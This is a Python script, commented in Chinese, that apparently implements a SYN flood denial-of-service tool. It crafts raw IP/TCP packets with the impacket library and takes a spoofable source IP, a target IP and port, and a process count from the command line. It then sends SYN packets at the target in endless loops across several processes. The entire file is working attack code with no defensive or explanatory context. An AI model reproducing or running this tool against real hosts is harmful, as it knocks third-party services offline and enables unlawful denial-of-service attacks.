import socket
import impacket.ImpactPacket
import warnings
import random
import threading
import multiprocessing
import sys

warnings.filterwarnings("ignore")

def send(src_ip,src_port,dst_ip,dst_port,count=1):
    s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)
    ip = impacket.ImpactPacket.IP()
    tcp = impacket.ImpactPacket.TCP()
    ip.set_ip_src(src_ip)#你的ip
    ip.set_ip_dst(dst_ip)#目标ip
    ip.set_ip_ttl(255)#ttl
    tcp.set_th_flags(0b00000010)#将syn标志位设为1
    tcp.set_th_sport(src_port)#源端口
    tcp.set_th_dport(dst_port)#目标端口
    tcp.set_th_ack(0)
    tcp.set_th_seq(22903)
    tcp.set_th_win(20000)#设置Window Size
    ip.contains(tcp)
    ip.calculate_checksum()
    #若循环出错，退出二次循环
    try:
        while 1:
            s.sendto(ip.get_packet(),(dst_ip,dst_port))
    except:
        pass
    #for n in range(count):
    #for n in iter(lambda: s.sendto(ip.get_packet(),(dst_ip,dst_port)),"ws"):
        #pass
    #print('send 1 packet')

def synFlood(src_ip,src_port,dst_ip,dst_port):
    if src_port == "random":
        src_port=random.randint(10000,60000)
    #while 1:
        #src_port=random.randint(10000,60000)
        #send(src_ip,src_port,dst_ip,dst_port)
    for n in iter(lambda: send(src_ip,src_port,dst_ip,dst_port),"ws"):
        pass

def parameter():
    global src_ip,src_port,dst_ip,dst_port,thread_count
    if len(sys.argv) != 6:
        print("参数错误")
        sys.exit()
    src_ip = sys.argv[1]
    src_port = int(sys.argv[2])
    dst_ip = sys.argv[3]
    dst_port = int(sys.argv[4])
    thread_count = int(sys.argv[5])
    
if __name__=='__main__':
    parameter()
    pros=[]
    for _ in range(thread_count):
        pros.append(multiprocessing.Process(target=synFlood,args=(src_ip,src_port,dst_ip,dst_port)))
    for pro in pros:
        pro.start()
